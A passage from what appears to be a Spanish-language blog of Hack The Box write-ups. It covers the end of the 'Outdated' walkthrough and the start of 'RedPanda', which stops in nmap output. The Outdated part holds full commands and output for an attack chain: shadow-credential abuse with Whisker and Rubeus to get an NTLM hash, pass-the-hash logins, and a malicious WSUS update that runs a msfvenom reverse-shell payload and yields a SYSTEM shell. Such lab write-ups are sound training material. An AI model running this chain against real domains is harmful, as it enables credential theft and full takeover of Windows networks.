14 15 PS C:\\Users\\btables\\Documents\u0026gt; .\\whisker.exe add /target:sflowers [*] No path was provided. The certificate will be printed as a Base64 blob [*] No pass was provided. The certificate will be stored with the password z6vcT6KlYkcM0cEO [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Generating certificate [*] Certificate generaged [*] Generating KeyCredential [*] KeyCredential generated with DeviceID 13e15ea2-beeb-4359-b6e0-3ea95ba50654 [*] Updating the msDS-KeyCredentialLink attribute of the target object [+] Updated the msDS-KeyCredentialLink attribute of the target object [*] You can now run Rubeus with the following syntax: Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb[..snip...]MjdrPc1x8e3oqStcIGBs1Lq4qq2WuKP0+K60qR98vxbaD3Yj0sy81Rj+JGCq0bPlcWvuQmkZLjZNghqTvbhTIXm6N3P2YsPkAdoEFfz1n+xtwhnmWjtpunnG7zA7MB8wBwYFKw4DAhoEFDLiTBGkHOLQTaojynGHJzAm1Z7oBBSLVfQwYoPnumGTEsLXL4b2Kb3/SAICB9A= /password:\u0026#34;z6vcT6KlYkcM0cEO\u0026#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show PS C:\\Users\\btables\\Documents\u0026gt; Si listamos el atributo msDS-KeyCredentialLink del usuario sflowers se lista uno, el creado anteriormente.\n1 2 3 4 5 6 PS C:\\Users\\btables\\Documents\u0026gt; .\\whisker.exe list /target:sflowers /domain:outdated.htb [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Listing deviced for sflowers: DeviceID: 13e15ea2-beeb-4359-b6e0-3ea95ba50654 | Creation Time: 9/9/2022 10:11:36 PM PS C:\\Users\\btables\\Documents\u0026gt; Tras ejecutar el comando sugerido por whisker logramos obtener un ticket y el hash NTLM del usuario sflowers.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 PS C:\\Users\\btables\\Documents\u0026gt; .\\r.exe asktgt /user:sflowers /certificate:MIIJuAIBA[..snip...]fQwYoPnumGTEsLXL4b2Kb3/SAICB9A= /password:\u0026#34;z6vcT6KlYkcM0cEO\u0026#34; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show ______ _ (_____ \\ | | _____) )_ _| |__ _____ _ _ ___ | __ /| | | | _ \\| ___ | | | |/___) | | \\ \\| |_| | |_) ) ____| |_| |___ | |_| |_|____/|____/|_____)____/(___/ v2.1.1 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers [*] Building AS-REQ (w/ PKINIT preauth) for: \u0026#39;outdated.htb\\sflowers\u0026#39; [*] Using domain controller: 172.16.20.1:88 [+] TGT request successful! [*] base64(ticket.kirbi): doIF0jCCBc6gAwIBBaEDAgEWooIE5zCCBONhggTfMIIE26ADAgEFoQ4bDE9VVERBVEVELkhUQqIhMB+g AwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRio4IEnzCCBJugAwIBEqEDAgECooIEjQSCBImnYSyI Fv0nCinEEulsN2rAM8FGicMCJj6PA3D6MFOx7UQbBC7ELwGF8fEi2qX6WFVCs6zu+T1onRALwQch23f+ [.. snip ..] BQBA4QAApREYDzIwMjIwOTEwMDUxMjI0WqYRGA8yMDIyMDkxMDE1MTIyNFqnERgPMjAyMjA5MTcwNTEy MjRaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi ServiceName : krbtgt/outdated.htb ServiceRealm : OUTDATED.HTB UserName : sflowers UserRealm : OUTDATED.HTB StartTime : 9/9/2022 10:12:24 PM EndTime : 9/10/2022 8:12:24 AM RenewTill : 9/16/2022 10:12:24 PM Flags : name_canonicalize, pre_authent, initial, renewable, forwardable KeyType : rc4_hmac Base64(key) : R5ozUlxM46ss2FD7D1VyDg== ASREP (key) : B644515A202DA1E73CA8D704B8AF046A [*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : 1FCDB1F6015DCB318CC77BB2BDA14DB5 PS C:\\Users\\btables\\Documents\u0026gt; Utilizamos el hash obtenido en smb, observamos que este usuario tiene acceso de lectura a la mayoria de recursos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/outdated ❯ crackmapexec smb outdated.htb -u sflowers -H :1FCDB1F6015DCB318CC77BB2BDA14DB5 --shares SMB outdated.htb 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:False) SMB outdated.htb 445 DC [+] outdated.htb\\sflowers::1FCDB1F6015DCB318CC77BB2BDA14DB5 SMB outdated.htb 445 DC [+] Enumerated shares SMB outdated.htb 445 DC Share Permissions Remark SMB outdated.htb 445 DC ----- ----------- ------ SMB outdated.htb 445 DC ADMIN$ Remote Admin SMB outdated.htb 445 DC C$ Default share SMB outdated.htb 445 DC IPC$ READ Remote IPC SMB outdated.htb 445 DC NETLOGON READ Logon server share SMB outdated.htb 445 DC Shares READ SMB outdated.htb 445 DC SYSVOL READ Logon server share SMB outdated.htb 445 DC UpdateServicesPackages READ,WRITE A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system. SMB outdated.htb 445 DC WsusContent READ,WRITE A network share to be used by Local Publishing to place published content on this WSUS system. SMB outdated.htb 445 DC WSUSTemp READ,WRITE A network share used by Local Publishing from a Remote WSUS Console Instance. π ~/htb/outdated ❯ En el recurso WsusContent encontramos dos archivos, aunque uno de ellos esta vacio y el otro no es accesible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 π ~/htb/outdated ❯ smbclient //outdated.htb/WsusContent -U sflowers --pw-nt-hash 1FCDB1F6015DCB318CC77BB2BDA14DB5 Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Fri Sep 9 23:24:10 2022 .. D 0 Fri Sep 9 23:24:10 2022 anonymousCheckFile.txt A 0 Wed Jun 15 08:38:14 2022 wuagent.exe Ar 0 Wed Jul 20 21:34:52 2022 9116415 blocks of size 4096. 1611933 blocks available smb: \\\u0026gt; get anonymousCheckFile.txt getting file \\anonymousCheckFile.txt of size 0 as anonymousCheckFile.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) smb: \\\u0026gt; get wuagent.exe NT_STATUS_INACCESSIBLE_SYSTEM_SHORTCUT opening remote file \\wuagent.exe smb: \\\u0026gt; get wuagent.exe NT_STATUS_INACCESSIBLE_SYSTEM_SHORTCUT opening remote file \\wuagent.exe smb: \\\u0026gt; exit π ~/htb/outdated ❯ cat anonymousCheckFile.txt π ~/htb/outdated ❯ Shell Utilizamos el hash por winrm, logrando obtener una shell y nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 π ~/htb/outdated ❯ evil-winrm -i outdated.htb -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5 Evil-WinRM shell v3.4 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; whoami outdated\\sflowers *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; cd ..\\Desktop *Evil-WinRM* PS C:\\Users\\sflowers\\Desktop\u0026gt; dir Directory: C:\\Users\\sflowers\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 8/3/2022 4:19 PM 514472 PsExec64.exe -ar--- 9/9/2022 9:43 PM 34 user.txt *Evil-WinRM* PS C:\\Users\\sflowers\\Desktop\u0026gt; cat user.txt 8076b8758010ef7f2fd692c8f80628df *Evil-WinRM* PS C:\\Users\\sflowers\\Desktop\u0026gt; Privesc Realizamos la ejecución de WinPEAS en la máquina, obtuvimos información que WSUS está siendo utilizado y se muestra vulnerable, además menciona una herramienta para escalar privilegios.\n1 2 3 4 5 ???????????? Checking WSUS ? https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#wsus WSUS is using http: http://wsus.outdated.htb:8530 ? You can test https://github.com/pimps/wsuxploit to escalate privileges And UseWUServer is equals to 1, so it is vulnerable! También observamos que el usuario sflowers pertenece al grupo WSUS Administrators.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes =========================================== ================ ============================================ =============================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group BUILTIN\\Certificate Service DCOM Access Alias S-1-5-32-574 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group OUTDATED\\WSUS Administrators Alias S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Plus Mandatory Level Label S-1-16-8448 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; WSUS WSUS es una solución para obtener actualizaciones Windows sin tener que conectarse a internet. Tras investigar formas de explotar esta solucion, nos topamos con SharpWSUS una herramienta que se presenta en un post de Nettitude - SharpWSUS la cual nos permitiría realizar movimiento lateral o escalar privilegios.\nSharpWSUS Tras compilar la solución, ejecutamos SharpWSUS en la máquina. Podemos observar el servidor e información de este, tambien los grupos necesarios para crear un update.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe locate ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Locate WSUS Server WSUS Server: http://wsus.outdated.htb:8530 [*] Locate complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe inspect ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Inspect WSUS Server ################# WSUS Server Enumeration via SQL ################## ServerName, WSUSPortNumber, WSUSContentLocation ----------------------------------------------- DC, 8530, c:\\WSUS\\WsusContent ####################### Computer Enumeration ####################### ComputerName, IPAddress, OSVersion, LastCheckInTime --------------------------------------------------- dc.outdated.htb, 172.16.20.1, 10.0.17763.1432, 9/10/2022 4:44:20 AM ####################### Downstream Server Enumeration ####################### ComputerName, OSVersion, LastCheckInTime --------------------------------------------------- ####################### Group Enumeration ####################### GroupName --------------------------------------------------- All Computers Downstream Servers Unassigned Computers [*] Inspect complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Creamos un parche/actualización utilizando como payload psexec, y como se menciona en el post debe de estar firmado por Microsoft, por lo que lo descargamos de la página de Microsoft. Como argumentos agregamos un ping a nuestra máquina, para realizar un test.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe create /payload:\u0026#34;C:\\Users\\sflowers\\Documents\\PsExec64.exe\u0026#34; /args:\u0026#34;-accepteula -s -d cmd.exe /c ping 10.10.14.207\u0026#34; /title:\u0026#34;Update\u0026#34; ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Create Update [*] Creating patch to use the following: [*] Payload: PsExec64.exe [*] Payload Path: C:\\Users\\sflowers\\Documents\\PsExec64.exe [*] Arguments: -accepteula -s -d cmd.exe /c ping 10.10.14.207 [*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c ping 10.10.14.207 ################# WSUS Server Enumeration via SQL ################## ServerName, WSUSPortNumber, WSUSContentLocation ----------------------------------------------- DC, 8530, c:\\WSUS\\WsusContent ImportUpdate Update Revision ID: 30 PrepareXMLtoClient InjectURL2Download DeploymentRevision PrepareBundle PrepareBundle Revision ID: 31 PrepareXMLBundletoClient DeploymentRevision [*] Update created - When ready to deploy use the following command: [*] SharpWSUS.exe approve /updateid:7f75a3ab-df94-4580-899e-716c9f782c4f /computername:Target.FQDN /groupname:\u0026#34;Group Name\u0026#34; [*] To check on the update status use the following command: [*] SharpWSUS.exe check /updateid:7f75a3ab-df94-4580-899e-716c9f782c4f /computername:Target.FQDN [*] To delete the update use the following command: [*] SharpWSUS.exe delete /updateid:7f75a3ab-df94-4580-899e-716c9f782c4f /computername:Target.FQDN /groupname:\u0026#34;Group Name\u0026#34; [*] Create complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Aprovamos el update y esperamos a que el update sea instalado, es posible ver el estado del update utilizando la flag check con el id del update.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe approve /updateid:7f75a3ab-df94-4580-899e-716c9f782c4f /computername:dc.outdated.htb /groupname:\u0026#34;All Computers\u0026#34; ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Approve Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 Group Exists = True Added Computer To Group Approved Update [*] Approve complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Luego de varios segundos obtuvimos ping por parte de la máquina.\n1 2 3 4 5 6 7 8 π ~/htb/outdated ❯ sudo tcpdump -i tun1 icmp [sudo] password for sckull: tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun1, link-type RAW (Raw IP), snapshot length 262144 bytes 23:06:57.508961 IP outdated.htb \u0026gt; 10.10.14.207: ICMP echo request, id 1, seq 44, length 40 23:06:57.509224 IP 10.10.14.207 \u0026gt; outdated.htb: ICMP echo reply, id 1, seq 44, length 40 23:06:58.527827 IP outdated.htb \u0026gt; 10.10.14.207: ICMP echo request, id 1, seq 45, length 40 23:06:58.527863 IP 10.10.14.207 \u0026gt; outdated.htb: ICMP echo reply, id 1, seq 45, length 40 Shell Nuevamente creamos un update esta vez ejecutando un payload de shell inversa creado con msfvenom.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe create /payload:\u0026#34;C:\\Users\\sflowers\\Documents\\PsExec64.exe\u0026#34; /args:\u0026#34;-accepteula -s -d cmd.exe /c C:\\Users\\sflowers\\Documents\\file.exe\u0026#34; /title:\u0026#34;Sussy Update v1\u0026#34; ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Create Update [*] Creating patch to use the following: [*] Payload: PsExec64.exe [*] Payload Path: C:\\Users\\sflowers\\Documents\\PsExec64.exe [*] Arguments: -accepteula -s -d cmd.exe /c C:\\Users\\sflowers\\Documents\\file.exe [*] Arguments (HTML Encoded): -accepteula -s -d cmd.exe /c C:\\Users\\sflowers\\Documents\\file.exe ################# WSUS Server Enumeration via SQL ################## ServerName, WSUSPortNumber, WSUSContentLocation ----------------------------------------------- DC, 8530, c:\\WSUS\\WsusContent ImportUpdate Update Revision ID: 32 PrepareXMLtoClient InjectURL2Download DeploymentRevision PrepareBundle PrepareBundle Revision ID: 33 PrepareXMLBundletoClient DeploymentRevision [*] Update created - When ready to deploy use the following command: [*] SharpWSUS.exe approve /updateid:e1f7e92f-2014-406f-b541-9e1f5474af9d /computername:Target.FQDN /groupname:\u0026#34;Group Name\u0026#34; [*] To check on the update status use the following command: [*] SharpWSUS.exe check /updateid:e1f7e92f-2014-406f-b541-9e1f5474af9d /computername:Target.FQDN [*] To delete the update use the following command: [*] SharpWSUS.exe delete /updateid:e1f7e92f-2014-406f-b541-9e1f5474af9d /computername:Target.FQDN /groupname:\u0026#34;Group Name\u0026#34; [*] Create complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Antes de aprovar el update creamos el archivo y lo movimos a la maquina y directorio ya definido.\n1 2 3 4 5 6 7 8 π ~/htb/outdated ❯ msfvenom -p windows/x64/shell_reverse_tcp LPORT=1338 LHOST=tun1 -f exe -o www/file.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: www/file.exe π ~/htb/outdated ❯ Aprovamos el update utilizando un nombre de grupo distinto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe approve /updateid:e1f7e92f-2014-406f-b541-9e1f5474af9d /computername:dc.outdated.htb /groupname:\u0026#34;New Group\u0026#34; ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Approve Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 Group Exists = False Group Created: New Group Added Computer To Group Approved Update [*] Approve complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Si verificamos el update, aun no ha sido instalado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe check /updateid:e1f7e92f-2014-406f-b541-9e1f5474af9d /computername:dc.outdated.htb ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Check Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 [*] Update is not installed [*] Check complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Luego de varios segundos logramos obtener una shell como administrador.\n1 2 3 4 5 6 7 8 9 π ~/htb/outdated ❯ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.207] from outdated.htb [10.10.11.175] 49277 Microsoft Windows [Version 10.0.17763.1432] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt; whoami nt authority\\system C:\\Windows\\system32\u0026gt; Si observamos el estado del update se muestra como instalado.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; .\\wsus.exe check /updateid:e1f7e92f-2014-406f-b541-9e1f5474af9d /computername:dc.outdated.htb ____ _ __ ______ _ _ ____ / ___|| |__ __ _ _ __ _ _\\ \\ / / ___|| | | / ___| \\___ \\| \u0026#39;_ \\ / _` | \u0026#39;__| \u0026#39;_ \\ \\ /\\ / /\\___ \\| | | \\___ \\ ___) | | | | (_| | | | |_) \\ V V / ___) | |_| |___) | |____/|_| |_|\\__,_|_| | .__/ \\_/\\_/ |____/ \\___/|____/ |_| Phil Keeble @ Nettitude Red Team [*] Action: Check Update Targeting dc.outdated.htb TargetComputer, ComputerID, TargetID ------------------------------------ dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1 [*] Update is installed [*] Check complete *Evil-WinRM* PS C:\\Users\\sflowers\\Documents\u0026gt; Finalmente logramos obtener nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 C:\\Windows\\system32\u0026gt; cd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop\u0026gt; dir Volume in drive C has no label. Volume Serial Number is 2170-25D8 Directory of C:\\Users\\Administrator\\Desktop 08/13/2022 09:40 PM \u0026lt;DIR\u0026gt; . 08/13/2022 09:40 PM \u0026lt;DIR\u0026gt; .. 09/09/2022 09:43 PM 34 root.txt 1 File(s) 34 bytes 2 Dir(s) 7,325,528,064 bytes free C:\\Users\\Administrator\\Desktop\u0026gt; more root.txt 50200d717f4c46cd91c744f1d9c9e51c C:\\Users\\Administrator\\Desktop\u0026gt; ","description":"La explotación de la vulnerabilidad Follina nos dió acceso a la máquina a un primer usuario. Con la ejecución de SharpHoond obtuvimos información que nos permitió acceder a un segundo usuario. Finalmente escalamos privilegios, ejecutando comandos por Wsus utilizando la herramienta SharpWSUS.","id":10,"section":"posts","tags":["smtp","swaks","CVE-2022-30190","bloodhound","sharphound","whisker","rubeus","winrm","wsus","sharpWSUS"],"title":"Hack The Box - Outdated","uri":"https://sckull.github.io/posts/outdated/"},{"content":"\rEn RedPanda descubrimos una vulnerabilidad SSTI en Java, en el sitio web, lo que nos permitió ejecutar comandos en la máquina. Las credenciales de la conexión de la base de datos nos permitieron acceder por SSH. Finalmente explotamos una vulnerabilidad de tipo XXE para realizar lectura de archivos y escalar privilegios.\nNombre RedPanda OS Linux Puntos 20 Dificultad Facil IP 10.10.11.170 Maker Woodenk\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[5.2, 4.9, 4.6, 5.4, 5.1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (8080) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 # Nmap 7.92 scan initiated Sat Jul 16 19:14:23 2022 as: nmap -p22,8080 -sV -sC -oN nmap_scan 10.10.11.170 Nmap scan report for 10.10.11.170 (10.10.11.170) Host is up (0.11s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 8080/tcp open http-proxy |_http-title: Red Panda Search | Made with Spring Boot | fingerprint-strings: | GetRequest: | HTTP/1.1 200 | Content-Type: text/html;charset=UTF-8 | Content-Language: en-US | Date: Sat, 16 Jul 2022 23:14:30 GMT | Connection: close | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34; dir=\u0026#34;ltr\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; | \u0026lt;meta author=\u0026#34;wooden_k\u0026#34;\u0026gt; | \u0026lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/panda.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;css/main.css\u0026#34; type=\u0026#34;text/css\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Red Panda Search | Made with Spring Boot\u0026lt;/title\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;div class=\u0026#39;pande\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;ear left\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;ear right\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers left\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;whiskers right\u0026#39;\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;span\u0026gt;\u0026lt;/span\u0026gt; | \u0026lt;/div\u0026gt; | \u0026lt;div class=\u0026#39;face\u0026#39;\u0026gt; | \u0026lt;div class=\u0026#39;eye | HTTPOptions: | HTTP/1.1 200 | Allow: GET,HEAD,OPTIONS | Content-Length: 0 | Date: Sat, 16 Jul 2022 23:14:30 GMT | Connection: close [.. snip ..] Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jul 16 19:14:45 2022 -- 1 IP address (1 host up) scanned in 22.47 seconds Web Site El sitio web no presenta información en los headers, sin embargo nmap muestra en el titulo 